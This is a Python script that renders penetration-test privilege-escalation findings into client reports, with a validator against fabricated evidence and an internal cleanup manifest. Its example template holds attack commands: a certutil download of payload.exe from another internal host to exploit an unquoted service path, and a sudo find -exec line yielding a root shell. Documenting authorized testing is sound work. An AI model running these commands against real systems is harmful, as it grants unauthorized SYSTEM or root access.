#!/usr/bin/env python3
"""gen_report.py — turn a findings file into a customer-ready privesc report.

Renders Markdown (executive summary + per-finding writeup with the FULL proof-of-concept command
trail) and auto-fills severity / CWE / description / remediation from _report_kb.py by vector_type.
Then exports to DOCX and PDF via pandoc (+ weasyprint for PDF).

Workflow:
  1) python3 gen_report.py --init findings.json      # scaffold a template you fill in as you work
  2) (edit findings.json: engagement info + one entry per PROVEN privesc, with the exact steps/commands)
  3) python3 gen_report.py findings.json              # -> report.md + report.docx + report.pdf

Options:
  -o <basename>        output basename (default: report)
  --formats md,docx,pdf   which to emit (default: all three)
  --check              anti-fabrication gate (exit 2 on errors) — run before rendering
  --cleanup            write the INTERNAL artifact-removal manifest
  --export-recce [f]   emit a KB-enriched JSON (default recce_findings.json) to fold
                       proven findings back into the recce workbook + report:
                       recce skoll-import <f> -o <engagement>

Each finding: { "title", "vector_type", "affected_host", "evidence",
                "steps": [ {"cmd": "...", "output": "..."}, ... ],   # the PROOF: what you ran + what you saw
                "severity"?  (optional override of the KB default),
                "references"? (optional extra, e.g. CVE) }
Valid vector_types: see _report_kb.KB (also listed in the --init template).
"""
import sys, os, json, subprocess
import _report_kb as RKB

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

TEMPLATE = {
    "engagement": {
        "client": "ACME Corp", "assessor": "Your Name", "date": "2026-07-26",
        "scope": "Authorized internal penetration test — privilege escalation",
        "targets": ["10.0.0.5 (WIN-SQL01, Windows Server 2019)", "10.0.0.6 (web01, Ubuntu 22.04)"],
        "background": "",       # optional: overrides the auto-generated Overview paragraph
        "overall_risk": "",     # optional: overrides the auto-generated overall-risk narrative
        "capture_method": "Full operator session recorded verbatim with script(1).",
        "evidence_log": "engagement.log",   # the raw session capture the PoC steps were taken from
        "limitations": "",                  # optional: overrides the standard Assessment-limitations boilerplate
    },
    "_valid_vector_types": sorted(RKB.KB.keys()),
    "findings": [
        {
            "title": "Unquoted service path on WIN-SQL01 permits SYSTEM code execution",
            "vector_type": "unquoted_service",
            "affected_host": "10.0.0.5 (WIN-SQL01)",
            "evidence": "The 'MyApp' service ran as LocalSystem with an unquoted ImagePath containing a space; "
                        "after planting a binary at C:\\Program.exe the service executed it and a SYSTEM shell "
                        "was returned.",
            "steps": [
                {"cmd": "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\"",
                 "output": "MyApp    C:\\Program Files\\My App\\svc.exe    Auto"},
                {"cmd": "icacls \"C:\\\"", "output": "C:\\ BUILTIN\\Users:(WD)   <- Users can write the drive root"},
                {"cmd": "certutil -urlcache -f http://10.0.0.10/payload.exe C:\\Program.exe",
                 "output": "CertUtil: -URLCache command completed successfully."},
                {"cmd": "sc stop MyApp & sc start MyApp", "output": "(service restarted)"},
                {"cmd": "whoami", "output": "nt authority\\system"},
            ],
            "artifacts": [
                {"desc": "Planted binary C:\\Program.exe on WIN-SQL01",
                 "remove": "del C:\\Program.exe"},
                {"desc": "The MyApp service was stopped and restarted during testing",
                 "remove": "(no revert needed — service returned to running state)"},
            ],
            "evidence_source": "engagement.log lines 210-260 (SYSTEM shell obtained 14:32 UTC)",
            "images": [
                {"path": "screenshots/win-sql01-system.png",
                 "caption": "whoami returns nt authority\\system on WIN-SQL01 after the service restart"}
            ],
        },
        {
            "title": "Passwordless sudo on /usr/bin/find (web01) permits root shell",
            "vector_type": "gtfobins_sudo",
            "affected_host": "10.0.0.6 (web01)",
            "evidence": "The 'deploy' user could run /usr/bin/find as root without a password; find's -exec "
                        "spawned a root shell.",
            "steps": [
                {"cmd": "sudo -l", "output": "(root) NOPASSWD: /usr/bin/find"},
                {"cmd": "sudo find . -exec /bin/sh \\; -quit", "output": "# id\nuid=0(root) gid=0(root) groups=0(root)"},
            ],
            "evidence_source": "engagement.log lines 512-540 (root shell obtained 15:07 UTC)",
        },
    ],
}

# ---- --init: scaffold a template ----
if "--init" in sys.argv or (len(sys.argv) > 1 and sys.argv[1] == "init"):
    path = opt("--init") or (sys.argv[2] if len(sys.argv) > 2 else "findings.json")
    if path in ("--init",): path = "findings.json"
    if os.path.exists(path):
        print(f"{path} already exists — not overwriting."); sys.exit(1)
    json.dump(TEMPLATE, open(path, "w"), indent=2)
    print(f"wrote {path}. Fill in engagement + one finding per PROVEN privesc (with steps/commands), then:")
    print(f"  python3 gen_report.py {path}")
    sys.exit(0)

# ---- load findings ----
args = [a for a in sys.argv[1:] if not a.startswith("-")]
if not args:
    print(__doc__); sys.exit(1)
src = args[0]
try:
    data = json.load(open(src))
except Exception as e:
    print(f"cannot read {src}: {e}"); sys.exit(1)

out     = opt("-o", "report")
formats = (opt("--formats", "md,docx,pdf")).split(",")
eng     = data.get("engagement", {})
findings = data.get("findings", [])
if not findings:
    print("no findings in the file."); sys.exit(1)

def sev_of(f):   return f.get("severity") or RKB.entry(f.get("vector_type", ""))["sev"]
def kb_of(f):    return RKB.entry(f.get("vector_type", ""))
findings = sorted(findings, key=lambda f: RKB.SEV_ORDER.get(sev_of(f), 9))

# ---- --check: anti-fabrication / completeness validator (run before you render) ----
if "--check" in sys.argv:
    PLACEHOLDERS = ("<pid>", "<target>", "<service", "<taskexe>", "<youruser>", "<the-allowed",
                    "/path/to", "example.com", "placeholder", "todo", "xxxx")
    errors, warns = [], []
    for i, f in enumerate(findings, 1):
        tag = f.get("title") or f.get("vector_type") or f"finding #{i}"
        vt = f.get("vector_type")
        if not vt:
            errors.append((tag, "missing vector_type"))
        elif vt not in RKB.KB:
            warns.append((tag, f"unknown vector_type '{vt}' — will use the generic remediation entry"))
        if not f.get("affected_host"): errors.append((tag, "missing affected_host"))
        if not f.get("evidence"):      warns.append((tag, "missing evidence summary"))
        if not f.get("evidence_source"): warns.append((tag, "no evidence_source (which capture/log proves this?)"))
        steps = f.get("steps", [])
        if not steps:
            errors.append((tag, "no proof-of-concept steps recorded"))
        for n, s in enumerate(steps, 1):
            s = {"cmd": s} if isinstance(s, str) else s
            if not str(s.get("cmd", "")).strip():
                errors.append((tag, f"step {n}: empty command"))
            if not str(s.get("output", "")).strip():
                errors.append((tag, f"step {n}: NO output captured — paste the verbatim tool output"))
            blob = (str(s.get("cmd", "")) + " " + str(s.get("output", ""))).lower()
            if any(p in blob for p in PLACEHOLDERS):
                warns.append((tag, f"step {n}: contains a placeholder token — replace with real captured output"))
        for im in f.get("images", []):
            p = im if isinstance(im, str) else im.get("path", "")
            if p and not os.path.exists(p):
                warns.append((tag, f"screenshot not found on disk: {p}"))
    for tag, m in errors: print(f"  ERROR  [{tag}] {m}")
    for tag, m in warns:  print(f"  warn   [{tag}] {m}")
    if errors:
        print(f"CHECK FAILED: {len(errors)} error(s), {len(warns)} warning(s). Fix errors before rendering.")
        sys.exit(2)
    print(f"CHECK OK: {len(findings)} finding(s) — every step has a command + captured output. "
          f"{len(warns)} warning(s).")
    sys.exit(0)

# ---- --cleanup: INTERNAL artifact-removal manifest (NOT for the client) ----
if "--cleanup" in sys.argv:
    C = []; c = C.append
    c(f"# INTERNAL CLEANUP MANIFEST — {eng.get('client','')} — {eng.get('date','')}")
    c("")
    c("> **INTERNAL USE ONLY — DO NOT DELIVER TO THE CLIENT.**")
    c("> Every item below is a change made to a **TARGET** system during testing "
      "(planted files, created accounts, edited configs, restarted services). "
      "Remove / revert ALL of them before closing the engagement — a leftover payload or backdoor account "
      "is a security exposure you introduced.")
    c("")
    by_host = {}
    for f in findings:
        by_host.setdefault(f.get("affected_host", "(unspecified host)"), []).append(f)
    for host, fs in by_host.items():
        c(f"## Host: {host}")
        c("")
        for f in fs:
            k = kb_of(f); rm = RKB.risk_meta(f.get("vector_type", ""))
            c(f"### {f.get('title') or k['name']}")
            c(f"*Risk of the exploit: **{RKB.risk_of(f.get('vector_type',''))}** — {rm['danger']}*")
            c("")
            c("Artifacts / changes to revert:")
            arts = f.get("artifacts", [])
            if not arts:
                c(f"- [ ] _(none recorded — confirm nothing was left; general guidance:)_ {rm['cleanup']}")
            else:
                for a in arts:
                    if isinstance(a, str):
                        c(f"- [ ] {a}")
                    else:
                        line = f"- [ ] {a.get('desc','artifact')}"
                        if a.get("remove"):
                            line += f"  →  `{a['remove']}`"
                        c(line)
                c(f"- [ ] _General:_ {rm['cleanup']}")
            c("")
    c("---")
    c("**Final check:** re-run enumeration as the low-priv user to confirm no planted files, accounts, "
      "or config lines remain; verify each affected service is back to its original state.")
    outp = f"{out}.cleanup.md"
    open(outp, "w").write("\n".join(C) + "\n")
    print(f"wrote {outp}  (INTERNAL cleanup manifest — do not send to the client)")
    sys.exit(0)

# ---- --export-recce: enrich findings for the recce enumeration tool to fold back in ----
# Writes a self-contained JSON (KB severity/CWE/remediation/risk resolved, host IP parsed out)
# that recce imports with `recce skoll-import <file>` so every PROVEN finding lands back in
# recce's workbook + report. Keeps the original finding fields and adds a `_recce` block per
# finding, so recce needs no copy of this KB.
if "--export-recce" in sys.argv:
    import re as _re
    def _parse_host(s):
        s = (s or "").strip()
        ipm = _re.search(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b", s)
        ip = ipm.group(1) if ipm else ""
        nm = _re.search(r"\(([^)]*)\)", s)
        name = nm.group(1).split(",")[0].strip() if nm else ("" if ip else s)
        return ip, name
    enriched = []
    for f in findings:
        vt = f.get("vector_type", "")
        k = kb_of(f)
        ip, name = _parse_host(f.get("affected_host", ""))
        cves = []
        for tok in _re.split(r"[,\s]+", " ".join(str(x) for x in
                             [k.get("refs", ""), f.get("references", "")] if x)):
            tok = tok.strip().rstrip(".;,")
            if tok.upper().startswith("CVE") and tok not in cves:
                cves.append(tok)
        g = dict(f)
        g["_recce"] = {
            "ip": ip, "hostname": name, "port": None,
            "severity": sev_of(f).lower(),
            "cwe": k.get("cwe", ""),
            "cwes": [k["cwe"]] if k.get("cwe") else [],
            "remediation": k.get("rem", ""),
            "description": k.get("desc", ""),
            "risk": RKB.risk_of(vt),
            "confidence": "confirmed",
            "ids": cves,
        }
        enriched.append(g)
    # optional value: `--export-recce [path]` (path may be omitted / be the last arg)
    _i = sys.argv.index("--export-recce")
    dest = sys.argv[_i + 1] if _i + 1 < len(sys.argv) else ""
    if not dest or dest.startswith("-"):
        dest = "recce_findings.json"
    payload = {"_recce_import": 1, "source": "skoll",
               "engagement": eng, "findings": enriched}
    json.dump(payload, open(dest, "w"), indent=2)
    print(f"wrote {dest}  ({len(enriched)} finding(s), KB-enriched for recce)")
    print(f"  fold into the recce workbook + report:  recce skoll-import {dest} -o <engagement>")
    sys.exit(0)

# ---- render markdown ----
L = []
w = L.append
w(f"# Privilege-Escalation Assessment — {eng.get('client','')}")
w("")
w(f"**Assessor:** {eng.get('assessor','')}  ")
w(f"**Date:** {eng.get('date','')}  ")
w(f"**Scope:** {eng.get('scope','')}  ")
if eng.get("targets"):
    w(f"**Targets:** {', '.join(eng['targets'])}")
w("")
w("---")
w("")

# executive summary
counts = {}
for f in findings:
    counts[sev_of(f)] = counts.get(sev_of(f), 0) + 1
SEV_MEAN = {
    "Critical": "trivially exploitable and leading to immediate, complete compromise of the affected host.",
    "High":     "reliably exploitable by a low-privileged user to obtain full administrative control (root / SYSTEM).",
    "Medium":   "exploitable under specific conditions, or granting partial elevation / requiring an existing privileged context.",
    "Low":      "limited impact, or exploitable only in narrow circumstances.",
    "Info":     "informational — no direct escalation, but relevant to the overall security posture.",
}
hosts = [h for h in dict.fromkeys(f.get("affected_host", "") for f in findings) if h]
nhost = len(hosts) or 1
top_sev = min((sev_of(f) for f in findings), key=lambda s: RKB.SEV_ORDER.get(s, 9))
full_control = sum(1 for f in findings if sev_of(f) in ("Critical", "High"))

w("## Executive summary")
w("")
w("### Overview")
w("")
if eng.get("background"):
    w(eng["background"])
else:
    w(f"At the request of {eng.get('client','the client')}, an authorized privilege-escalation assessment was "
      f"performed against the in-scope system(s). The objective was to determine whether an attacker with a "
      f"low-privileged foothold could escalate to full administrative control (root / SYSTEM), and to document "
      f"every viable path with concrete, reproducible evidence and actionable remediation.")
w("")
w("### Results")
w("")
w(f"The assessment identified **{len(findings)} privilege-escalation finding(s)** across "
  f"**{nhost} in-scope host(s)**. By severity:")
w("")
for s in RKB.SEV_ORDER:
    if s in counts:
        w(f"- **{counts[s]} {s}** — {SEV_MEAN[s]}")
w("")
if eng.get("overall_risk"):
    w(eng["overall_risk"])
elif full_control:
    w(f"The overall risk is assessed as **{top_sev}**. {full_control} of the {len(findings)} finding(s) allow an "
      f"attacker to obtain complete administrative control of the affected host. With that access an attacker "
      f"could read or alter all data on the system, disable security controls and logging, harvest stored "
      f"credentials, and use the host as a foothold to move laterally into the wider environment. Because these "
      f"are local escalation paths, they compound any lower-severity access (a phished user, a web foothold, a "
      f"reused password) into a full host compromise.")
else:
    w(f"The overall risk is assessed as **{top_sev}**. See each finding for specific impact.")
w("")
w("### Severity ratings")
w("")
w("Severity reflects how reliably each weakness can be exploited and the level of access it yields: "
  "**Critical** — immediate full compromise; **High** — reliably exploitable to full admin control; "
  "**Medium** — conditional or partial elevation; **Low/Info** — limited or contextual.")
w("")
w("### Methodology & completeness")
w("")
w("Each finding was **validated hands-on** — confirmed by execution rather than inferred from version numbers "
  "alone — and the exact commands and their observed results are reproduced in the proof-of-concept section of "
  "each writeup so the customer can independently verify and re-test after remediation. Where a host exposed "
  "more than one escalation path, **all paths are reported, not only the first exploited**: each is an "
  "independent weakness that must be remediated on its own, and closing one does not close the others.")
if eng.get("capture_method") or eng.get("evidence_log"):
    prov = eng.get("capture_method", "")
    if eng.get("evidence_log"):
        prov = (prov + " " if prov else "") + f"The raw session capture (`{eng['evidence_log']}`) is retained and " \
               "referenced per finding, so every command and result is traceable to the recorded evidence."
    w("")
    w(prov)
w("")
w("### Findings at a glance")
w("")
w("| # | Finding | Severity | Affected host | CWE |")
w("|---|---------|----------|---------------|-----|")
for i, f in enumerate(findings, 1):
    k = kb_of(f)
    title = f.get("title") or k["name"]
    w(f"| {i} | {title} | {sev_of(f)} | {f.get('affected_host','')} | {k['cwe']} |")
w("")
w("---")
w("")

# per-finding
for i, f in enumerate(findings, 1):
    k = kb_of(f)
    title = f.get("title") or k["name"]
    refs = ", ".join(x for x in [k.get("refs"), f.get("references")] if x)
    w(f"## {i}. {title}")
    w("")
    w(f"**Severity:** {sev_of(f)}  ")
    w(f"**Affected host:** {f.get('affected_host','')}  ")
    w(f"**Classification:** {k['cwe']}" + (f" · {refs}" if refs else "") + "  ")
    w("")
    w("### Description")
    w("")
    w(k["desc"])
    w("")
    if f.get("evidence"):
        w("### Evidence")
        w("")
        w(f["evidence"])
        w("")
    w("### Proof of concept — steps & commands")
    w("")
    steps = f.get("steps", [])
    if not steps:
        w("_(no reproduction steps recorded)_")
        w("")
    for n, s in enumerate(steps, 1):
        if isinstance(s, str):
            s = {"cmd": s}
        w(f"**Step {n}.** Command:")
        w("")
        w("```")
        w(s.get("cmd", "").rstrip())
        w("```")
        if s.get("output"):
            w("")
            w("Result:")
            w("")
            w("```")
            w(str(s["output"]).rstrip())
            w("```")
        w("")
    if f.get("evidence_source"):
        w(f"**Evidence source:** {f['evidence_source']}")
        w("")
    imgs = f.get("images", [])
    if imgs:
        w("### Screenshots")
        w("")
        for im in imgs:
            path = im if isinstance(im, str) else im.get("path", "")
            cap = "" if isinstance(im, str) else im.get("caption", "")
            if not path:
                continue
            w(f"![{cap}]({path})")
            if cap:
                w("")
                w(f"*{cap}*")
            w("")
    arts = f.get("artifacts", [])
    if arts:
        w("### Changes made during testing")
        w("")
        w("To validate this finding the following changes were made to the target and have been reverted "
          "(see the internal cleanup manifest):")
        for a in arts:
            desc = a if isinstance(a, str) else a.get("desc", "change")
            w(f"- {desc}")
        w("")
    w("### Remediation")
    w("")
    w(k["rem"])
    w("")
    w("---")
    w("")

# ---- assessment limitations (boilerplate; overridable via engagement.limitations) ----
w("## Assessment limitations")
w("")
if eng.get("limitations"):
    w(eng["limitations"])
else:
    w("- **Absence of findings is not proof of security.** This assessment enumerated a defined set of known "
      "privilege-escalation vectors within the authorized scope and time window; it does not exhaustively cover "
      "custom applications, business-logic flaws, or novel techniques. A clean result for a host means no vector "
      "*from the tested set* was found, not that none exists — manual review is recommended.")
    w("- **Point-in-time.** Findings reflect the systems' state during the test window; later changes (patches, "
      "new software, configuration drift) can add or remove exposure.")
    w("- **Remediation guidance is general.** The fixes below are standard best practice and must be validated "
      "against the client's specific environment, dependencies, and change-management process before deployment.")
    w("- **Scope.** Only systems explicitly in scope were tested. Domain/lateral-movement and persistence were "
      "out of scope for this local-privilege-escalation assessment.")
w("")
w("---")
w("")

md = "\n".join(L) + "\n"
md_path = f"{out}.md"
open(md_path, "w").write(md)
print(f"wrote {md_path}  ({len(findings)} findings)")

# ---- export ----
def have(t): return subprocess.call(["bash", "-lc", f"command -v {t} >/dev/null"]) == 0
pandoc = have("pandoc")

if "docx" in formats:
    if pandoc:
        r = subprocess.run(["pandoc", md_path, "-o", f"{out}.docx"], capture_output=True, text=True)
        print(f"wrote {out}.docx" if r.returncode == 0 else f"docx FAILED: {r.stderr.strip()}")
    else:
        print(f"# docx: install pandoc, then:  pandoc {md_path} -o {out}.docx")

if "pdf" in formats:
    if pandoc and have("weasyprint"):
        r = subprocess.run(["pandoc", md_path, "-o", f"{out}.pdf", "--pdf-engine=weasyprint"],
                           capture_output=True, text=True)
        print(f"wrote {out}.pdf" if r.returncode == 0 else f"pdf FAILED: {r.stderr.strip()}")
    else:
        print(f"# pdf: install pandoc + weasyprint, then:  pandoc {md_path} -o {out}.pdf --pdf-engine=weasyprint")

print("# air-gapped operator box: pre-stage pandoc + weasyprint (apt) to enable docx/pdf export.")
